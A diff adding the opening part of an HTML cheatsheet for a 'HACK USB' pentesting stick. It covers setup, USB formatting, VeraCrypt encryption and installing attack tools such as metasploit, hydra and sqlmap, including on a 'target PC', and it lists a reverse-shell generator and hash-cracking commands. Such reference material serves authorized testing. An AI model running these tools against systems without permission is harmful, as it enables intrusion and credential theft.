@@ -1,0 +1,1819 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HACK USB — Cheatsheet</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Bebas+Neue&display=swap');
+:root {
+  --bg:#0c0c0e; --sur:#131318; --sur2:#1a1a22; --bor:#222230;
+  --red:#ff3355; --cy:#00e5cc; --ye:#ffc840; --gr:#39ff8a;
+  --pu:#c084fc; --or:#fb923c; --bl:#60a5fa;
+  --dim:#55556a; --tx:#d8dce8;
+  --mono:'JetBrains Mono',monospace; --dis:'Bebas Neue',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{font-size:15px;scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--tx);font-family:var(--mono);line-height:1.7;}
+.layout{display:flex;min-height:100vh;}
+
+/* ── OS SWITCHER BAR ── */
+.osbar{position:fixed;top:0;left:0;right:0;z-index:999;background:#09090c;
+  border-bottom:2px solid var(--bor);display:flex;align-items:center;gap:0;height:44px;}
+.osbar .logo-small{padding:0 20px;font-family:var(--dis);font-size:18px;letter-spacing:4px;
+  color:var(--red);border-right:1px solid var(--bor);height:100%;display:flex;align-items:center;white-space:nowrap;}
+.osbar .os-btns{display:flex;gap:0;height:100%;}
+.os-btn{background:none;border:none;border-right:1px solid var(--bor);
+  font-family:var(--mono);font-size:11px;letter-spacing:2px;color:var(--dim);
+  padding:0 20px;cursor:pointer;transition:all .15s;height:100%;display:flex;align-items:center;gap:8px;}
+.os-btn:hover{color:var(--tx);background:rgba(255,255,255,.03);}
+.os-btn.active-mac{color:var(--cy);background:rgba(0,229,204,.08);border-bottom:2px solid var(--cy);}
+.os-btn.active-linux{color:var(--gr);background:rgba(57,255,138,.08);border-bottom:2px solid var(--gr);}
+.os-btn.active-win{color:var(--bl);background:rgba(96,165,250,.08);border-bottom:2px solid var(--bl);}
+.os-btn .os-icon{font-size:14px;}
+.os-indicator{margin-left:auto;padding:0 18px;font-size:9px;letter-spacing:2px;color:var(--dim);}
+.os-badge{display:inline-block;font-size:8px;padding:1px 6px;border-radius:2px;margin-left:5px;font-family:var(--mono);}
+.os-mac .os-badge{background:rgba(0,229,204,.15);color:var(--cy);}
+.os-linux .os-badge{background:rgba(57,255,138,.15);color:var(--gr);}
+.os-win .os-badge{background:rgba(96,165,250,.15);color:var(--bl);}
+
+/* ── SIDEBAR ── */
+.sidebar{width:265px;min-height:100vh;background:var(--sur);border-right:2px solid var(--bor);
+  position:sticky;top:44px;height:calc(100vh - 44px);overflow-y:auto;flex-shrink:0;display:flex;flex-direction:column;}
+.logo{padding:20px 20px 14px;border-bottom:1px solid var(--bor);}
+.logo .t{font-family:var(--dis);font-size:28px;letter-spacing:4px;color:var(--red);line-height:1;}
+.logo .s{font-size:9px;color:var(--dim);letter-spacing:2px;margin-top:4px;}
+.logo .w{margin-top:10px;padding:6px 9px;border:1px solid var(--red);
+  background:rgba(255,51,85,.07);font-size:9px;color:var(--red);letter-spacing:1px;}
+.logo .os-label{margin-top:8px;font-size:9px;letter-spacing:2px;padding:4px 8px;border:1px solid var(--bor);display:inline-block;}
+nav{padding:8px 0;flex:1;}
+.ns{font-size:8px;letter-spacing:3px;color:var(--dim);padding:12px 20px 3px;text-transform:uppercase;}
+.ni{display:block;width:100%;background:none;border:none;text-align:left;
+  padding:9px 20px;font-family:var(--mono);font-size:11px;color:var(--dim);
+  cursor:pointer;letter-spacing:1px;border-left:3px solid transparent;transition:all .15s;}
+.ni:hover{color:var(--tx);background:rgba(255,255,255,.03);}
+.ni.a{color:var(--cy);border-left-color:var(--cy);background:rgba(0,229,204,.06);}
+.ni.np{color:#7a6a90;}.ni.np.a{color:var(--pu);border-left-color:var(--pu);background:rgba(192,132,252,.06);}
+.ni.nb{color:#4a7a6a;}.ni.nb.a{color:var(--gr);border-left-color:var(--gr);background:rgba(57,255,138,.06);}
+.ni.nbl{color:#4a607a;}.ni.nbl.a{color:var(--bl);border-left-color:var(--bl);background:rgba(96,165,250,.06);}
+.ni .n{color:var(--dim);margin-right:6px;font-size:9px;}
+.ni.a .n,.ni.np.a .n,.ni.nb.a .n,.ni.nbl.a .n{color:inherit;}
+.badge{font-size:7px;padding:1px 4px;border:1px solid currentColor;margin-left:4px;opacity:.8;}
+
+/* ── CONTENT ── */
+.content{flex:1;padding:40px 50px;max-width:1160px;margin-top:44px;}
+.sec{display:none;}.sec.a{display:block;}
+.st{font-family:var(--dis);font-size:48px;letter-spacing:5px;color:var(--tx);line-height:1;margin-bottom:7px;}
+.st span{color:var(--cy);}.st .np{color:var(--pu);}.st .ng{color:var(--gr);}
+.sd{font-size:11px;color:var(--dim);letter-spacing:1px;margin-bottom:30px;
+  padding-bottom:16px;border-bottom:1px solid var(--bor);}
+
+/* ── OS SPECIFIC BLOCKS ── */
+.os-block{display:none;}
+body.os-mac .os-mac{display:block;}
+body.os-linux .os-linux{display:block;}
+body.os-win .os-win{display:block;}
+td.os-block{display:none !important;}
+body.os-mac td.os-mac{display:table-cell !important;}
+body.os-linux td.os-linux{display:table-cell !important;}
+body.os-win td.os-win{display:table-cell !important;}
+.os-note{font-size:10px;letter-spacing:1px;padding:3px 8px;border:1px solid var(--bor);margin-left:8px;vertical-align:middle;}
+body.os-mac .os-note.mac{border-color:var(--cy);color:var(--cy);}
+body.os-linux .os-note.linux{border-color:var(--gr);color:var(--gr);}
+body.os-win .os-note.win{border-color:var(--bl);color:var(--bl);}
+
+/* ── ALERTS ── */
+.al{padding:12px 18px;border:1px solid var(--red);background:rgba(255,51,85,.07);
+  font-size:12px;color:var(--red);letter-spacing:1px;margin-bottom:22px;line-height:1.7;}
+.ay{border-color:var(--ye);background:rgba(255,200,64,.06);color:var(--ye);}
+.ac{border-color:var(--cy);background:rgba(0,229,204,.06);color:var(--cy);}
+.ap{border-color:var(--pu);background:rgba(192,132,252,.06);color:var(--pu);}
+.ag{border-color:var(--gr);background:rgba(57,255,138,.06);color:var(--gr);}
+.abl{border-color:var(--bl);background:rgba(96,165,250,.06);color:var(--bl);}
+
+/* ── EXPLAIN BOXES ── */
+.ex{background:#0f0f16;border:1px solid var(--bor);border-left:3px solid var(--cy);
+  padding:14px 18px;margin-bottom:14px;font-size:12px;color:#9899b8;line-height:1.9;}
+.ex.ep{border-left-color:var(--pu);}
+.ex.eg{border-left-color:var(--gr);}
+.ex.ey{border-left-color:var(--ye);}
+.ex.eb{border-left-color:var(--bl);}
+.ex strong{color:var(--cy);font-weight:600;}
+.ex.ep strong{color:var(--pu);}
+.ex.eg strong{color:var(--gr);}
+.ex.ey strong{color:var(--ye);}
+.ex.eb strong{color:var(--bl);}
+.ex .how{color:var(--ye);font-weight:600;}
+.ex code{color:var(--gr);font-size:11px;background:#09090c;padding:1px 5px;border:1px solid var(--bor);}
+
+/* ── CMD BLOCKS ── */
+.cb{margin-bottom:30px;}
+.cbt{font-family:var(--dis);font-size:18px;letter-spacing:3px;color:var(--ye);
+  margin-bottom:12px;display:flex;align-items:center;gap:10px;}
+.cbt::after{content:'';flex:1;height:1px;background:var(--bor);}
+.cbt.cp{color:var(--pu);}.cbt.cg{color:var(--gr);}.cbt.cc{color:var(--cy);}
+.cbt.cbl{color:var(--bl);}
+
+/* ── TABLE ── */
+table.ct{width:100%;border-collapse:collapse;margin-bottom:6px;}
+.ct tr{border-bottom:1px solid var(--bor);}
+.ct tr:last-child{border-bottom:none;}
+.ct tr:hover{background:rgba(0,229,204,.03);}
+.ct td{padding:10px 14px;vertical-align:top;}
+.ct td:first-child{font-size:11px;color:var(--gr);width:38%;word-break:break-all;font-weight:600;}
+.ct td:nth-child(2){font-size:11px;color:var(--dim);width:25%;}
+.ct td:nth-child(3){font-size:10px;color:#5a5a75;width:37%;font-style:italic;line-height:1.6;}
+.ct th{font-size:9px;letter-spacing:2px;color:var(--dim);text-align:left;
+  padding:6px 14px;border-bottom:1px solid var(--bor);}
+
+/* ── TERMINAL ── */
+.term{background:#09090c;border:1px solid var(--bor);border-top:3px solid var(--cy);margin-bottom:24px;}
+.term.tp{border-top-color:var(--pu);}.term.tg{border-top-color:var(--gr);}
+.term.ty{border-top-color:var(--ye);}.term.tb{border-top-color:var(--bl);}
+.tbar{background:#111118;padding:8px 14px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--bor);}
+.dot{width:10px;height:10px;border-radius:50%;}
+.dr{background:#ff5f57;}.dy2{background:#febc2e;}.dg2{background:#28c840;}
+.tt{font-size:10px;color:var(--dim);margin-left:7px;letter-spacing:2px;}
+.term pre{padding:18px 20px;font-family:var(--mono);font-size:12px;color:var(--gr);line-height:2;overflow-x:auto;}
+.term pre .c{color:var(--dim);}.term pre .y{color:var(--ye);}.term pre .r{color:var(--red);}
+.term pre .w{color:var(--tx);}.term pre .b{color:var(--bl);}.term pre .p{color:var(--pu);}
+
+/* ── LAYOUTS ── */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-bottom:28px;}
+.three{display:grid;grid-template-columns:1fr 1fr 1fr;gap:18px;margin-bottom:28px;}
+@media(max-width:900px){.two,.three{grid-template-columns:1fr;}.sidebar{display:none;}.content{padding:18px;}}
+
+/* ── MISC ── */
+.tag{display:inline-block;font-size:8px;letter-spacing:2px;padding:2px 7px;
+  margin-right:4px;margin-bottom:3px;border:1px solid;}
+.tr{border-color:var(--red);color:var(--red);}.tc{border-color:var(--cy);color:var(--cy);}
+.ty2{border-color:var(--ye);color:var(--ye);}.tg2{border-color:var(--gr);color:var(--gr);}
+.tp2{border-color:var(--pu);color:var(--pu);}.tb2{border-color:var(--bl);color:var(--bl);}
+hr.dv{border:none;border-top:1px solid var(--bor);margin:26px 0;}
+.igrid{display:grid;grid-template-columns:repeat(2,1fr);gap:18px;margin-bottom:28px;}
+.ibox{background:var(--sur2);border:1px solid var(--bor);padding:18px 20px;}
+.ibox-t{font-family:var(--dis);font-size:14px;letter-spacing:2px;margin-bottom:10px;}
+.ibox p{font-size:11px;color:var(--dim);line-height:1.8;}
+::-webkit-scrollbar{width:5px;}::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--bor);}
+@keyframes fu{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
+.sec.a{animation:fu .2s ease;}
+</style>
+</head>
+<body class="os-mac">
+
+<!-- ── OS SWITCHER ─────────────────────────────────────── -->
+<div class="osbar">
+  <div class="logo-small">HACK USB</div>
+  <div class="os-btns">
+    <button class="os-btn" id="btn-mac" onclick="setOS('mac')">
+      <span class="os-icon">🍎</span> macOS
+    </button>
+    <button class="os-btn" id="btn-linux" onclick="setOS('linux')">
+      <span class="os-icon">🐧</span> Linux
+    </button>
+    <button class="os-btn" id="btn-win" onclick="setOS('win')">
+      <span class="os-icon">🪟</span> Windows
+    </button>
+  </div>
+  <div class="os-indicator" id="os-indicator">SYSTEM: MACOS</div>
+</div>
+
+<div class="layout">
+
+<!-- SIDEBAR -->
+<aside class="sidebar">
+  <div class="logo">
+    <div class="t">HACK<br>USB</div>
+    <div class="s">ETHICAL PENTESTING REFERENCE</div>
+    <div class="w">⚠ AUTHORIZED USE ONLY</div>
+    <div class="os-label" id="sidebar-os-label">🍎 macOS</div>
+  </div>
+  <nav>
+    <div class="ns">Setup</div>
+    <button class="ni a"  onclick="show('start',this)"><span class="n">00</span>QUICK START</button>
+    <button class="ni nb" onclick="show('usb',this)"><span class="n">01</span>USB FORMAT</button>
+    <button class="ni nb" onclick="show('install_pc',this)"><span class="n">02</span>INSTALL ON PC</button>
+    <div class="ns">Runtimes</div>
+    <button class="ni np" onclick="show('nodejs',this)"><span class="n">03</span>NODE.JS</button>
+    <button class="ni np" onclick="show('python',this)"><span class="n">04</span>PYTHON</button>
+    <button class="ni np" onclick="show('golang',this)"><span class="n">05</span>GO TOOLS</button>
+    <div class="ns">Hacking</div>
+    <button class="ni" onclick="show('recon',this)"><span class="n">06</span>RECON & OSINT</button>
+    <button class="ni" onclick="show('scanning',this)"><span class="n">07</span>SCANNING</button>
+    <button class="ni" onclick="show('web',this)"><span class="n">08</span>WEB HACKING</button>
+    <button class="ni" onclick="show('exploit',this)"><span class="n">09</span>EXPLOITATION</button>
+    <button class="ni" onclick="show('postexploit',this)"><span class="n">10</span>POST-EXPLOIT</button>
+    <button class="ni" onclick="show('activedir',this)"><span class="n">11</span>ACTIVE DIRECTORY</button>
+    <button class="ni" onclick="show('wireless',this)"><span class="n">12</span>WIRELESS</button>
+    <button class="ni" onclick="show('passwords',this)"><span class="n">13</span>PASSWORDS</button>
+    <button class="ni" onclick="show('revshells',this)"><span class="n">14</span>REV SHELLS</button>
+    <button class="ni" onclick="show('privesc',this)"><span class="n">15</span>PRIVESC</button>
+    <button class="ni" onclick="show('forensics',this)"><span class="n">16</span>FORENSICS</button>
+    <button class="ni nbl" onclick="show('tools',this)"><span class="n">17</span>TOOLS REF</button>
+    <div class="ns">Features</div>
+    <button class="ni np" onclick="show('adblocker',this)"><span class="n">18</span>AD BLOCKER</button>
+    <button class="ni np" onclick="show('vault',this)"><span class="n">19</span>VAULT</button>
+    <button class="ni np" onclick="show('autoupdate',this)"><span class="n">20</span>AUTO-UPDATE</button>
+  </nav>
+</aside>
+
+<main class="content">
+
+<!-- ══ 00 QUICK START ══════════════════════════════════════ -->
+<div class="sec a" id="start">
+  <div class="st">QUICK<span> START</span></div>
+  <div class="sd">HACK USB — ONE COMMAND SETUP · macOS · LINUX · WINDOWS (WSL2)</div>
+  <div class="al">⚠ All tools and techniques only on systems you own or have explicit written permission to test! CH: Art. 143bis StGB · DE: §202a StGB · US: CFAA 18 U.S.C. §1030</div>
+
+  <div class="cb">
+    <div class="cbt">ONE COMMAND — FULL SETUP</div>
+    <div class="os-block os-mac">
+      <div class="term">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">macOS — Terminal</div></div>
+        <pre><span class="c"># macOS — no sudo needed</span>
+chmod +x hackusb_setup.zsh
+zsh hackusb_setup.zsh
+
+<span class="c"># Step 0 → Select OS (macOS)</span>
+<span class="c"># Step 1 → Auto-detect system</span>
+<span class="c"># Step 2 → Choose stick size (16 / 32 / 64 GB)</span>
+<span class="c"># Step 3 → Set mount path (/Volumes/HACKUSB)</span>
+<span class="c"># Step 4 → Features: Auto-Update, Vault, Ad-Blocker</span>
+<span class="c"># Step 5 → Format USB stick (optional)</span>
+<span class="c"># Step 6 → Install: Homebrew + Python + Node.js + Go + Ruby + Rust</span>
+<span class="c"># Step 7 → Create 17 directories</span>
+<span class="c"># Step 8 → Clone tools (sqlmap, nuclei, theharvester...)</span>
+<span class="c"># Step 9 → Download wordlists (rockyou.txt)</span>
+<span class="c"># Step 10 → Write custom scripts</span>
+<span class="c"># Step 11 → Ad-Blocker (Hagezi Pro + Malware)</span>
+<span class="c"># Step 12 → VeraCrypt Vault</span>
+<span class="c"># Step 13 → Auto-Update script</span>
+<span class="c"># Step 14 → Copy cheatsheet</span></pre>
+      </div>
+    </div>
+    <div class="os-block os-linux">
+      <div class="term tg">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">Linux — Terminal</div></div>
+        <pre><span class="c"># Linux — sudo needed for apt installs</span>
+chmod +x hackusb_setup.zsh
+sudo zsh hackusb_setup.zsh
+
+<span class="c"># At Step 0: select [2] Linux</span>
+<span class="c"># Choose package manager: apt / pacman / dnf / zypper</span>
+<span class="c"># All tools installed via your distro's package manager</span>
+<span class="c"># Node.js via NodeSource (always latest LTS)</span></pre>
+      </div>
+    </div>
+    <div class="os-block os-win">
+      <div class="term tb">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">Windows — WSL2 recommended</div></div>
+        <pre><span class="c"># Windows — WSL2 strongly recommended</span>
+<span class="c"># Option A: WSL2 (full Linux compatibility)</span>
+wsl --install          <span class="c"># PowerShell as Admin, then reboot</span>
+<span class="c"># In WSL2 Ubuntu:</span>
+sudo zsh hackusb_setup.zsh
+<span class="c"># Select [3] Windows WSL2 at Step 0</span>
+
+<span class="c"># Option B: Git Bash (limited — no aircrack, hydra...)</span>
+zsh hackusb_setup.zsh
+<span class="c"># Select [4] Windows Native + winget/choco</span>
+
+<span class="c"># USB path in WSL2:</span>
+<span class="c"># Drive E: → /mnt/e/HACKUSB</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">ALL COMMANDS AT A GLANCE</div>
+    <table class="ct">
+      <tr><th>Action</th><th>Command</th><th>Notes</th></tr>
+      <tr><td>Open cheatsheet</td>
+        <td class="os-block os-mac">open /Volumes/HACKUSB/10_cheatsheets/index.html</td>
+        <td class="os-block os-linux">xdg-open /media/$USER/HACKUSB/10_cheatsheets/index.html</td>
+        <td class="os-block os-win">start E:\HACKUSB\10_cheatsheets\index.html</td>
+        <td>Works offline in any browser</td></tr>
+      <tr><td>Auto-Recon</td><td>zsh 08_scripts/auto_recon.zsh &lt;TARGET&gt; [--full]</td><td>nmap + subfinder + gobuster + nikto + nuclei</td></tr>
+      <tr><td>Subdomain enum</td><td>zsh 08_scripts/subdomain_enum.zsh &lt;DOMAIN&gt;</td><td>subfinder + assetfinder + amass + httpx</td></tr>
+      <tr><td>Live host scan</td><td>python3 08_scripts/livehosts.py 192.168.1.0/24</td><td>Ping sweep, 150 threads</td></tr>
+      <tr><td>Port scan</td><td>python3 08_scripts/port_scan.py &lt;HOST&gt; [1-65535]</td><td>Pure Python, no nmap needed</td></tr>
+      <tr><td>Reverse shell gen</td><td>python3 08_scripts/revshell_gen.py 10.0.0.1 4444</td><td>12 variants: bash, python, php, ps...</td></tr>
+      <tr><td>Hash crack</td><td>python3 08_scripts/hashcrack.py &lt;HASH&gt;</td><td>Auto-detect + rockyou.txt</td></tr>
+      <tr><td>Install on PC</td><td>zsh 08_scripts/install_on_pc.zsh</td><td>Deploy tools on any machine from USB</td></tr>
+      <tr><td>Update everything</td><td>sudo zsh hackusb_update.zsh</td><td>git pull + blocklists + wordlists</td></tr>
+      <tr><td>Ad-Blocker ON</td><td>sudo zsh 13_adblocker/setup_adblocker.zsh</td><td>Choose profile → hosts + DNS flush</td></tr>
+      <tr><td>Ad-Blocker status</td><td>sudo zsh 13_adblocker/setup_adblocker.zsh --status</td><td>Count blocked domains</td></tr>
+      <tr><td>Ad-Blocker OFF</td><td>sudo zsh 13_adblocker/setup_adblocker.zsh --restore</td><td>Restores original /etc/hosts</td></tr>
+      <tr><td>Open vault</td><td>zsh 14_vault/vault.zsh mount</td><td>VeraCrypt container → /Volumes/VAULT</td></tr>
+      <tr><td>Close vault</td><td>zsh 14_vault/vault.zsh unmount</td><td>Always before removing stick!</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══ 01 USB FORMAT ════════════════════════════════════════ -->
+<div class="sec" id="usb">
+  <div class="st">USB<span> FORMAT</span></div>
+  <div class="sd">FORMAT · BACKUP · ENCRYPTION — ExFAT WORKS ON ALL SYSTEMS</div>
+  <div class="ex eg"><strong>Why ExFAT?</strong> ExFAT is the only filesystem natively readable/writable on macOS, Linux and Windows — no drivers needed. FAT32 has a 4 GB per-file limit (too small for ISOs). NTFS is read-only on macOS by default. <span class="how">Recommendation:</span> ExFAT for all sticks &gt;32 GB, FAT32 only as fallback if ExFAT tools are missing.</div>
+
+  <div class="os-block os-mac">
+    <div class="cb">
+      <div class="cbt cg">Format — macOS</div>
+      <div class="term tg">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">macOS — diskutil</div></div>
+        <pre><span class="c"># Step 1: Find stick</span>
+diskutil list
+<span class="c"># Look for: /dev/disk2 (external, physical)</span>
+<span class="c"># ⚠ ALWAYS verify disk number — never use disk0 (system)!</span>
+
+<span class="c"># Step 2: Format entire stick (including partition table)</span>
+diskutil eraseDisk ExFAT HACKUSB /dev/disk2
+<span class="c"># → Mounts at: /Volumes/HACKUSB</span>
+
+<span class="c"># Alternatively: Format only one partition</span>
+diskutil eraseVolume ExFAT HACKUSB /dev/disk2s1
+
+<span class="c"># Safe eject</span>
+diskutil eject /dev/disk2</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="os-block os-linux">
+    <div class="cb">
+      <div class="cbt cg">Format — Linux</div>
+      <div class="term tg">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">Linux — lsblk + mkfs</div></div>
+        <pre><span class="c"># Step 1: Find stick</span>
+lsblk -o NAME,SIZE,TYPE,MOUNTPOINT,LABEL
+<span class="c"># Output: sdb  14.9G disk  ← that's the stick</span>
+<span class="c"># ⚠ NEVER use sda — that's the system drive!</span>
+
+<span class="c"># Step 2: Unmount</span>
+sudo umount /dev/sdb1
+
+<span class="c"># Step 3: Install ExFAT tools</span>
+sudo apt install exfatprogs          <span class="c"># Ubuntu 22.04+</span>
+sudo apt install exfat-fuse exfat-utils  <span class="c"># older Ubuntu</span>
+sudo pacman -S exfatprogs            <span class="c"># Arch/Manjaro</span>
+
+<span class="c"># Step 4: Format</span>
+sudo mkfs.exfat -n "HACKUSB" /dev/sdb1
+<span class="c"># Fallback (no exfat available):</span>
+sudo mkfs.vfat -F 32 -n "HACKUSB" /dev/sdb1
+
+<span class="c"># Step 5: Mount</span>
+sudo mkdir -p /media/$USER/HACKUSB
+sudo mount /dev/sdb1 /media/$USER/HACKUSB</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="os-block os-win">
+    <div class="cb">
+      <div class="cbt cbl">Format — Windows</div>
+      <div class="term tb">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">Windows PowerShell (as Admin)</div></div>
+        <pre><span class="c"># Format via PowerShell (Admin)</span>
+Format-Volume -DriveLetter E -FileSystem exFAT -NewFileSystemLabel HACKUSB
+
+<span class="c"># Or via diskpart:</span>
+diskpart
+list disk          <span class="c"># find USB disk number</span>
+select disk 1      <span class="c"># ⚠ check number first!</span>
+clean
+create partition primary
+format fs=exfat label="HACKUSB" quick
+assign letter=E
+exit
+
+<span class="c"># In WSL2 — access USB stick:</span>
+ls /mnt/e/         <span class="c"># E: = /mnt/e/</span>
+cd /mnt/e/HACKUSB</pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">BACKUP BEFORE FORMAT</div>
+    <div class="term">
+      <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">rsync backup</div></div>
+      <pre><span class="c"># macOS:</span>
+rsync -avh --progress /Volumes/HACKUSB/ ~/hackusb_backup_$(date +%Y%m%d)/
+
+<span class="c"># Linux:</span>
+rsync -avh --progress /media/$USER/HACKUSB/ ~/hackusb_backup_$(date +%Y%m%d)/
+
+<span class="c"># Verify backup size:</span>
+du -sh ~/hackusb_backup_*/
+
+<span class="c"># Restore after reformat:</span>
+rsync -avh ~/hackusb_backup_20250501/ /Volumes/HACKUSB/</pre>
+    </div>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt cg">Vault Only (recommended)</div>
+      <div class="ex eg" style="font-size:11px;"><strong>What it is:</strong> One encrypted file (secrets.vc) on the stick. Rest is unencrypted — all tools run normally. <span class="how">Best for:</span> Protecting credentials, SSH keys, reports.</div>
+      <div class="term tg"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">vault.zsh</div></div>
+        <pre>zsh 14_vault/vault.zsh mount
+<span class="c"># → /Volumes/VAULT (macOS) or /mnt/hackusb_vault (Linux)</span>
+zsh 14_vault/vault.zsh unmount   <span class="c"># Before removing stick!</span>
+zsh 14_vault/vault.zsh status
+zsh 14_vault/vault.zsh backup</pre>
+      </div>
+    </div>
+    <div class="cb">
+      <div class="cbt">Full Encryption</div>
+      <div class="ex ey" style="font-size:11px;"><strong>When useful:</strong> If the whole stick must be encrypted (lost stick protection). <span class="how">Downside:</span> VeraCrypt needed on every computer. Without password — all data is lost.</div>
+      <div class="term ty"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">VeraCrypt full</div></div>
+        <pre>veracrypt --text --create /dev/disk2 \
+  --volume-type=normal --encryption=AES \
+  --hash=SHA-512 --filesystem=exFAT \
+  --password=<span class="r">STRONG_PASSWORD</span> \
+  --random-source=/dev/urandom
+<span class="c"># Mount: veracrypt /dev/disk2 /Volumes/HACKUSB</span>
+<span class="c"># Eject: veracrypt -d /dev/disk2</span></pre>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ 02 INSTALL ON PC ═════════════════════════════════════ -->
+<div class="sec" id="install_pc">
+  <div class="st">INSTALL<span> ON PC</span></div>
+  <div class="sd">DEPLOY HACK TOOLS ON ANY MACHINE — FROM USB IN SECONDS</div>
+  <div class="ac">💡 Use <strong>zsh 08_scripts/install_on_pc.zsh</strong> to install all pentest tools directly on the target PC. Perfect when you plug in the USB and need tools fast.</div>
+
+  <div class="ex"><strong>What it does:</strong> One script — quick interactive menu — installs nmap, hydra, sqlmap, john, hashcat, go tools (subfinder, nuclei, ffuf...), python pentest libs, Node.js, Rust, Ruby gems on the host machine. Three profiles: Quick (5 min) / Standard (15 min) / Full (30+ min).</div>
+
+  <div class="cb">
+    <div class="cbt">RUN FROM USB STICK</div>
+    <div class="os-block os-mac">
+      <div class="term">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">macOS</div></div>
+        <pre><span class="c"># Run from USB stick:</span>
+zsh /Volumes/HACKUSB/08_scripts/install_on_pc.zsh
+
+<span class="c"># Installs on this Mac:</span>
+<span class="c">  Quick    → nmap, git, python3, go, node, curl, wget, jq, tmux</span>
+<span class="c">  Standard → + hydra, masscan, sqlmap, nikto, gobuster, john,</span>
+<span class="c">               hashcat, binwalk, exiftool, aircrack-ng</span>
+<span class="c">  Full     → + metasploit, hcxtools, wireshark, foremost</span>
+
+<span class="c"># Go tools (all profiles):</span>
+<span class="c">  subfinder, httpx, nuclei, ffuf, dnsx, katana,</span>
+<span class="c">  waybackurls, assetfinder, gf, anew, gau</span>
+
+<span class="c"># Python tools (all profiles):</span>
+<span class="c">  impacket, scapy, pwntools, requests, mitmproxy</span></pre>
+      </div>
+    </div>
+    <div class="os-block os-linux">
+      <div class="term tg">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">Linux</div></div>
+        <pre><span class="c"># Run from USB stick:</span>
+sudo zsh /media/$USER/HACKUSB/08_scripts/install_on_pc.zsh
+
+<span class="c"># Installs via apt/pacman/dnf:</span>
+<span class="c">  Quick    → git, curl, python3, go, nodejs, build-essential</span>
+<span class="c">  Standard → + nmap, hydra, masscan, sqlmap, nikto, gobuster,</span>
+<span class="c">               john, hashcat, aircrack-ng, binwalk, exiftool</span>
+<span class="c">  Full     → + metasploit-framework, hcxtools, wireshark</span>
+
+<span class="c"># After install — activate PATH:</span>
+source ~/.zshrc</pre>
+      </div>
+    </div>
+    <div class="os-block os-win">
+      <div class="term tb">
+        <div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">Windows (Git Bash / WSL2)</div></div>
+        <pre><span class="c"># WSL2 (recommended):</span>
+sudo zsh /mnt/e/HACKUSB/08_scripts/install_on_pc.zsh
+
+<span class="c"># Git Bash (limited):</span>
+zsh E:/HACKUSB/08_scripts/install_on_pc.zsh
+
+<span class="c"># Installs via winget/choco:</span>
+<span class="c">  Git.Git, Python.Python.3.12, Golang.Go,</span>
+<span class="c">  OpenJS.NodeJS.LTS, Nmap.Nmap, VeraCrypt.VeraCrypt,</span>
+<span class="c">  Microsoft.WindowsTerminal, RubyInstaller</span>
+
+<span class="c"># Note: For full tool support, use WSL2!</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">WHAT GETS INSTALLED</div>
+      <table class="ct">
+        <tr><th>Category</th><th>Tools</th><th>Profile</th></tr>
+        <tr><td>Scanners</td><td>nmap, masscan, naabu, rustscan</td><td><span class="tag tg2">QUICK+</span></td></tr>
+        <tr><td>Web</td><td>sqlmap, nikto, gobuster, ffuf, feroxbuster</td><td><span class="tag ty2">STD+</span></td></tr>
+        <tr><td>Passwords</td><td>hydra, john, hashcat</td><td><span class="tag ty2">STD+</span></td></tr>
+        <tr><td>Exploitation</td><td>metasploit, pwntools, impacket</td><td><span class="tag tr">FULL</span></td></tr>
+        <tr><td>OSINT</td><td>subfinder, amass, assetfinder, gau</td><td><span class="tag tg2">QUICK+</span></td></tr>
+        <tr><td>Web crawl</td><td>httpx, katana, nuclei, waybackurls</td><td><span class="tag tg2">QUICK+</span></td></tr>
+        <tr><td>Forensics</td><td>binwalk, exiftool, volatility3</td><td><span class="tag ty2">STD+</span></td></tr>
+        <tr><td>Wireless</td><td>aircrack-ng, hcxtools</td><td><span class="tag tr">FULL</span></td></tr>
+        <tr><td>Python libs</td><td>scapy, certipy-ad, mitmproxy, shodan</td><td><span class="tag ty2">STD+</span></td></tr>
+        <tr><td>Ruby gems</td><td>wpscan, evil-winrm</td><td><span class="tag ty2">STD+</span></td></tr>
+        <tr><td>Rust tools</td><td>feroxbuster, rustscan</td><td><span class="tag ty2">STD+</span></td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">VERIFY INSTALL</div>
